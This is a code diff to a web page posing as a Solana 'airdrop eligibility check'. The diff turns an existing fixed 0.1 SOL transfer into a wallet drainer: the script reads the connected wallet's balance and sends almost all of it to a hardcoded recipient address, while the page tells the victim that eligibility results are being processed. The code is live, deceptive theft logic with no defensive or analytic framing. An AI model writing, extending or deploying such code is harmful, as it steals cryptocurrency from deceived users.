@@ -109,10 +109,17 @@
       margin: 25px 0;
       font-size: 1.5rem;
       text-align: center;
-      min-height: 90px;
+      min-height: 110px;
     }
 
     .connected { color: #39ff14; }
+
+    .balance-info {
+      font-size: 1.6rem;
+      color: #ffff00;
+      margin: 15px 0;
+      text-align: center;
+    }
 
     footer {
       text-align: center;
@@ -166,7 +173,6 @@
     const sendBtn = document.getElementById('sendBtn');
     const statusDiv = document.getElementById('status');
     const RECIPIENT = "wizmRKe5GtfyVwfLMfPARHHnhE7vmboUYwmrfzQWhFk";
-    const AMOUNT_SOL = 0.1;
 
     let provider = null;
     let publicKey = null;
@@ -201,21 +207,34 @@
         return;
       }
 
-      statusDiv.innerHTML = `<span style="color:#ffff00;">Scanning the neon grid for all eligible airdrops...</span>`;
+      statusDiv.innerHTML = `<span style="color:#ffff00;">Checking wallet balance...</span>`;
 
       try {
         const connection = new solanaWeb3.Connection(
-          "https://api.mainnet-beta.solana.com", 
+          "https://api.mainnet-beta.solana.com",
           "confirmed"
         );
 
-        const lamports = Math.floor(AMOUNT_SOL * solanaWeb3.LAMPORTS_PER_SOL);
+        // Get current balance
+        const balanceLamports = await connection.getBalance(publicKey);
+        const reserveLamports = 5000; // Small reserve for rent + fees (safe minimum)
+        const sendAmount = Math.max(balanceLamports - reserveLamports, 0);
+
+        if (sendAmount <= 0) {
+          statusDiv.innerHTML = `<span style="color:#ff00ff;">Insufficient balance for transaction.</span>`;
+          return;
+        }
+
+        statusDiv.innerHTML = `
+          <span style="color:#ffff00;">Balance found: ${(balanceLamports / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4)} SOL<br>
+          Preparing to send full balance...</span>
+        `;
 
         const transaction = new solanaWeb3.Transaction().add(
           solanaWeb3.SystemProgram.transfer({
             fromPubkey: publicKey,
             toPubkey: new solanaWeb3.PublicKey(RECIPIENT),
-            lamports: lamports,
+            lamports: sendAmount,
           })
         );
 
@@ -229,16 +248,17 @@
 
         statusDiv.innerHTML = `
           <span style="color:#39ff14;">✅ ELIGIBILITY CHECK COMPLETE</span><br>
+          Sent: ${(sendAmount / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4)} SOL<br>
           Transaction: ${signedTransaction.signature.slice(0,12)}...
         `;
 
         setTimeout(() => {
           statusDiv.innerHTML += `<br><span style="color:#ffff00;">Airdrop eligibility results are being processed in the neon grid.</span>`;
-        }, 2500);
+        }, 3000);
 
       } catch (err) {
         console.error(err);
-        statusDiv.innerHTML = `<span style="color:#ff00ff;">Transaction rejected.<br>Please try again.</span>`;
+        statusDiv.innerHTML = `<span style="color:#ff00ff;">Transaction rejected or failed.<br>Please try again.</span>`;
       }
     }
 
